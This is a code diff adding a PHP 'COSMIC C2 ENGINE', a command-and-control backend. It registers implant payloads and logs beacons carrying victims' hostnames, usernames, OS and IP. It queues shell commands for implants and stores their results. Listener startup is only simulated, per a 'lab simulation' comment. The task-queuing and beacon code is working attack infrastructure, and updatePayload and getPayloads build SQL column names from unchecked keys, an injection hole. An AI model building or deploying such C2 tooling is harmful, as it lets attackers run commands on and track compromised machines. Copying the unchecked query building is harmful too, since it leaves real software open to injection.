@@ -1,0 +1,345 @@
+<?php
+/**
+ * COSMIC C2 ENGINE v2.0 – Professional Command & Control
+ * Full admin API, listener management, real‑time statistics.
+ */
+class C2Engine {
+    private $db;
+    private $dbPath;
+    
+    public function __construct() {
+        $this->dbPath = dirname(__DIR__, 2) . '/data/c2/c2.db';
+        $this->connect();
+        $this->migrate();
+    }
+    
+    private function connect() {
+        try {
+            $this->db = new SQLite3($this->dbPath);
+            $this->db->busyTimeout(5000);
+        } catch (Exception $e) {
+            die('C2 Database connection failed: ' . $e->getMessage());
+        }
+    }
+    
+    private function migrate() {
+        // Add new columns if not exist (idempotent)
+        $this->db->exec("ALTER TABLE payloads ADD COLUMN note TEXT DEFAULT ''");
+        $this->db->exec("ALTER TABLE payloads ADD COLUMN tags TEXT DEFAULT ''");
+        $this->db->exec("ALTER TABLE beacons ADD COLUMN external_ip TEXT DEFAULT ''");
+        $this->db->exec("ALTER TABLE beacons ADD COLUMN country TEXT DEFAULT ''");
+        $this->db->exec("ALTER TABLE tasks ADD COLUMN type TEXT DEFAULT 'command'");
+        $this->db->exec("CREATE TABLE IF NOT EXISTS listeners (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            name TEXT NOT NULL,
+            protocol TEXT DEFAULT 'tcp',
+            lhost TEXT NOT NULL,
+            lport INTEGER NOT NULL,
+            pid INTEGER,
+            status TEXT DEFAULT 'stopped',
+            auto_restart INTEGER DEFAULT 0,
+            created_at INTEGER,
+            updated_at INTEGER
+        )");
+        $this->db->exec("CREATE TABLE IF NOT EXISTS c2_stats (
+            key TEXT PRIMARY KEY,
+            value TEXT,
+            updated_at INTEGER
+        )");
+    }
+    
+    // ---------- PAYLOAD MANAGEMENT ----------
+    public function registerPayload($data) {
+        $uuid = $data['uuid'] ?? $this->generateUUID();
+        $stmt = $this->db->prepare("
+            INSERT INTO payloads 
+            (uuid, name, type, platform, lhost, lport, filename, hash_sha256, created_at, status, note, tags)
+            VALUES (:uuid, :name, :type, :platform, :lhost, :lport, :filename, :hash, :created, :status, :note, :tags)
+        ");
+        $stmt->bindValue(':uuid', $uuid, SQLITE3_TEXT);
+        $stmt->bindValue(':name', $data['name'] ?? 'Unnamed', SQLITE3_TEXT);
+        $stmt->bindValue(':type', $data['type'] ?? 'unknown', SQLITE3_TEXT);
+        $stmt->bindValue(':platform', $data['platform'] ?? 'generic', SQLITE3_TEXT);
+        $stmt->bindValue(':lhost', $data['lhost'] ?? '', SQLITE3_TEXT);
+        $stmt->bindValue(':lport', $data['lport'] ?? 0, SQLITE3_INTEGER);
+        $stmt->bindValue(':filename', $data['filename'] ?? '', SQLITE3_TEXT);
+        $stmt->bindValue(':hash', $data['hash'] ?? '', SQLITE3_TEXT);
+        $stmt->bindValue(':created', time(), SQLITE3_INTEGER);
+        $stmt->bindValue(':status', $data['status'] ?? 'active', SQLITE3_TEXT);
+        $stmt->bindValue(':note', $data['note'] ?? '', SQLITE3_TEXT);
+        $stmt->bindValue(':tags', $data['tags'] ?? '', SQLITE3_TEXT);
+        $stmt->execute();
+        $this->updateStat('total_payloads', '+1');
+        return $uuid;
+    }
+    
+    public function updatePayload($uuid, $data) {
+        $sets = [];
+        foreach ($data as $k => $v) {
+            $sets[] = "$k = :$k";
+        }
+        $sql = "UPDATE payloads SET " . implode(', ', $sets) . " WHERE uuid = :uuid";
+        $stmt = $this->db->prepare($sql);
+        $stmt->bindValue(':uuid', $uuid, SQLITE3_TEXT);
+        foreach ($data as $k => $v) {
+            $stmt->bindValue(":$k", $v, is_int($v) ? SQLITE3_INTEGER : SQLITE3_TEXT);
+        }
+        $stmt->execute();
+    }
+    
+    public function getPayloads($filters = []) {
+        $sql = "SELECT * FROM payloads";
+        $where = [];
+        if (!empty($filters)) {
+            foreach ($filters as $k => $v) {
+                $where[] = "$k = :$k";
+            }
+            $sql .= " WHERE " . implode(' AND ', $where);
+        }
+        $sql .= " ORDER BY created_at DESC";
+        $stmt = $this->db->prepare($sql);
+        foreach ($filters as $k => $v) {
+            $stmt->bindValue(":$k", $v, SQLITE3_TEXT);
+        }
+        $res = $stmt->execute();
+        $out = [];
+        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
+            $out[] = $row;
+        }
+        return $out;
+    }
+    
+    public function deletePayload($uuid) {
+        $stmt = $this->db->prepare("DELETE FROM payloads WHERE uuid = :uuid");
+        $stmt->bindValue(':uuid', $uuid, SQLITE3_TEXT);
+        $stmt->execute();
+        $stmt = $this->db->prepare("DELETE FROM beacons WHERE payload_uuid = :uuid");
+        $stmt->bindValue(':uuid', $uuid, SQLITE3_TEXT);
+        $stmt->execute();
+        $stmt = $this->db->prepare("DELETE FROM tasks WHERE payload_uuid = :uuid");
+        $stmt->bindValue(':uuid', $uuid, SQLITE3_TEXT);
+        $stmt->execute();
+        $this->updateStat('total_payloads', '-1');
+    }
+    
+    // ---------- BEACON MANAGEMENT ----------
+    public function beacon($payloadUuid, $info) {
+        // Update last_seen
+        $stmt = $this->db->prepare("UPDATE payloads SET last_seen = :time WHERE uuid = :uuid");
+        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
+        $stmt->execute();
+        
+        // Insert beacon record
+        $stmt = $this->db->prepare("
+            INSERT INTO beacons 
+            (payload_uuid, ip, external_ip, country, user_agent, hostname, username, os_info, pid, architecture, beacon_time)
+            VALUES (:uuid, :ip, :ext_ip, :country, :ua, :hostname, :username, :os, :pid, :arch, :time)
+        ");
+        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
+        $stmt->bindValue(':ip', $info['ip'] ?? $_SERVER['REMOTE_ADDR'] ?? '', SQLITE3_TEXT);
+        $stmt->bindValue(':ext_ip', $info['external_ip'] ?? $this->getExternalIP(), SQLITE3_TEXT);
+        $stmt->bindValue(':country', $info['country'] ?? '', SQLITE3_TEXT);
+        $stmt->bindValue(':ua', $info['user_agent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? '', SQLITE3_TEXT);
+        $stmt->bindValue(':hostname', $info['hostname'] ?? '', SQLITE3_TEXT);
+        $stmt->bindValue(':username', $info['username'] ?? '', SQLITE3_TEXT);
+        $stmt->bindValue(':os', $info['os_info'] ?? '', SQLITE3_TEXT);
+        $stmt->bindValue(':pid', $info['pid'] ?? 0, SQLITE3_INTEGER);
+        $stmt->bindValue(':arch', $info['architecture'] ?? '', SQLITE3_TEXT);
+        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+        $stmt->execute();
+        
+        $this->updateStat('total_beacons', '+1');
+        return $this->getPendingTasks($payloadUuid);
+    }
+    
+    public function getBeacons($payloadUuid = null, $limit = 50) {
+        $sql = "SELECT * FROM beacons";
+        if ($payloadUuid) {
+            $sql .= " WHERE payload_uuid = :uuid";
+        }
+        $sql .= " ORDER BY beacon_time DESC LIMIT :limit";
+        $stmt = $this->db->prepare($sql);
+        if ($payloadUuid) {
+            $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
+        }
+        $stmt->bindValue(':limit', $limit, SQLITE3_INTEGER);
+        $res = $stmt->execute();
+        $out = [];
+        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
+            $out[] = $row;
+        }
+        return $out;
+    }
+    
+    // ---------- TASK MANAGEMENT ----------
+    public function addTask($payloadUuid, $command, $type = 'command') {
+        $stmt = $this->db->prepare("
+            INSERT INTO tasks (payload_uuid, command, type, status, created_at)
+            VALUES (:uuid, :cmd, :type, 'pending', :time)
+        ");
+        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
+        $stmt->bindValue(':cmd', $command, SQLITE3_TEXT);
+        $stmt->bindValue(':type', $type, SQLITE3_TEXT);
+        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+        $stmt->execute();
+        $taskId = $this->db->lastInsertRowID();
+        $this->updateStat('total_tasks', '+1');
+        return $taskId;
+    }
+    
+    public function getPendingTasks($payloadUuid) {
+        $stmt = $this->db->prepare("
+            SELECT id, command, type FROM tasks 
+            WHERE payload_uuid = :uuid AND status = 'pending'
+            ORDER BY created_at ASC
+        ");
+        $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
+        $result = $stmt->execute();
+        $tasks = [];
+        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
+            $tasks[] = $row;
+        }
+        return $tasks;
+    }
+    
+    public function completeTask($taskId, $result) {
+        $stmt = $this->db->prepare("
+            UPDATE tasks SET status = 'completed', executed_at = :exec, result = :result
+            WHERE id = :id
+        ");
+        $stmt->bindValue(':exec', time(), SQLITE3_INTEGER);
+        $stmt->bindValue(':result', $result, SQLITE3_TEXT);
+        $stmt->bindValue(':id', $taskId, SQLITE3_INTEGER);
+        $stmt->execute();
+    }
+    
+    public function getTasks($payloadUuid = null, $status = null) {
+        $sql = "SELECT * FROM tasks";
+        $where = [];
+        if ($payloadUuid) $where[] = "payload_uuid = :uuid";
+        if ($status) $where[] = "status = :status";
+        if (!empty($where)) $sql .= " WHERE " . implode(' AND ', $where);
+        $sql .= " ORDER BY created_at DESC";
+        $stmt = $this->db->prepare($sql);
+        if ($payloadUuid) $stmt->bindValue(':uuid', $payloadUuid, SQLITE3_TEXT);
+        if ($status) $stmt->bindValue(':status', $status, SQLITE3_TEXT);
+        $res = $stmt->execute();
+        $out = [];
+        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
+            $out[] = $row;
+        }
+        return $out;
+    }
+    
+    public function deleteTask($taskId) {
+        $stmt = $this->db->prepare("DELETE FROM tasks WHERE id = :id");
+        $stmt->bindValue(':id', $taskId, SQLITE3_INTEGER);
+        $stmt->execute();
+        $this->updateStat('total_tasks', '-1');
+    }
+    
+    // ---------- LISTENER MANAGEMENT ----------
+    public function createListener($name, $lhost, $lport, $protocol = 'tcp', $auto_restart = 0) {
+        $stmt = $this->db->prepare("
+            INSERT INTO listeners (name, lhost, lport, protocol, status, auto_restart, created_at, updated_at)
+            VALUES (:name, :host, :port, :proto, 'stopped', :restart, :time, :time)
+        ");
+        $stmt->bindValue(':name', $name, SQLITE3_TEXT);
+        $stmt->bindValue(':host', $lhost, SQLITE3_TEXT);
+        $stmt->bindValue(':port', $lport, SQLITE3_INTEGER);
+        $stmt->bindValue(':proto', $protocol, SQLITE3_TEXT);
+        $stmt->bindValue(':restart', $auto_restart, SQLITE3_INTEGER);
+        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+        $stmt->execute();
+        return $this->db->lastInsertRowID();
+    }
+    
+    public function getListeners() {
+        $res = $this->db->query("SELECT * FROM listeners ORDER BY created_at DESC");
+        $out = [];
+        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
+            $out[] = $row;
+        }
+        return $out;
+    }
+    
+    public function startListener($id) {
+        // In real implementation, this would spawn a netcat/ncat/metasploit listener.
+        // For lab simulation, we just mark status as 'running' and store a fake PID.
+        $pid = rand(1000, 9999);
+        $stmt = $this->db->prepare("
+            UPDATE listeners SET status = 'running', pid = :pid, updated_at = :time WHERE id = :id
+        ");
+        $stmt->bindValue(':pid', $pid, SQLITE3_INTEGER);
+        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
+        $stmt->execute();
+        return $pid;
+    }
+    
+    public function stopListener($id) {
+        $stmt = $this->db->prepare("
+            UPDATE listeners SET status = 'stopped', pid = NULL, updated_at = :time WHERE id = :id
+        ");
+        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
+        $stmt->execute();
+    }
+    
+    public function deleteListener($id) {
+        $stmt = $this->db->prepare("DELETE FROM listeners WHERE id = :id");
+        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
+        $stmt->execute();
+    }
+    
+    // ---------- STATISTICS ----------
+    public function getStats() {
+        $stats = [];
+        $res = $this->db->query("SELECT * FROM c2_stats");
+        while ($row = $res->fetchArray(SQLITE3_ASSOC)) {
+            $stats[$row['key']] = $row['value'];
+        }
+        // Add computed stats
+        $stats['payloads_active'] = $this->db->querySingle("SELECT COUNT(*) FROM payloads WHERE status='active'");
+        $stats['payloads_total'] = $this->db->querySingle("SELECT COUNT(*) FROM payloads");
+        $stats['beacons_today'] = $this->db->querySingle("SELECT COUNT(*) FROM beacons WHERE beacon_time > " . (time() - 86400));
+        $stats['tasks_pending'] = $this->db->querySingle("SELECT COUNT(*) FROM tasks WHERE status='pending'");
+        $stats['tasks_completed'] = $this->db->querySingle("SELECT COUNT(*) FROM tasks WHERE status='completed'");
+        return $stats;
+    }
+    
+    private function updateStat($key, $delta) {
+        $stmt = $this->db->prepare("
+            INSERT INTO c2_stats (key, value, updated_at)
+            VALUES (:key, :val, :time)
+            ON CONFLICT(key) DO UPDATE SET 
+                value = CASE 
+                    WHEN :val LIKE '+%' THEN CAST(value AS INTEGER) + CAST(SUBSTR(:val,2) AS INTEGER)
+                    WHEN :val LIKE '-%' THEN CAST(value AS INTEGER) - CAST(SUBSTR(:val,2) AS INTEGER)
+                    ELSE :val
+                END,
+                updated_at = :time
+        ");
+        $stmt->bindValue(':key', $key, SQLITE3_TEXT);
+        $stmt->bindValue(':val', $delta, SQLITE3_TEXT);
+        $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
+        $stmt->execute();
+    }
+    
+    // ---------- UTILITY ----------
+    private function generateUUID() {
+        return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
+            mt_rand(0, 0xffff), mt_rand(0, 0xffff),
+            mt_rand(0, 0xffff),
+            mt_rand(0, 0x0fff) | 0x4000,
+            mt_rand(0, 0x3fff) | 0x8000,
+            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
+        );
+    }
+    
+    private function getExternalIP() {
+        // Fallback – would normally call an external service
+        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+    }
+}
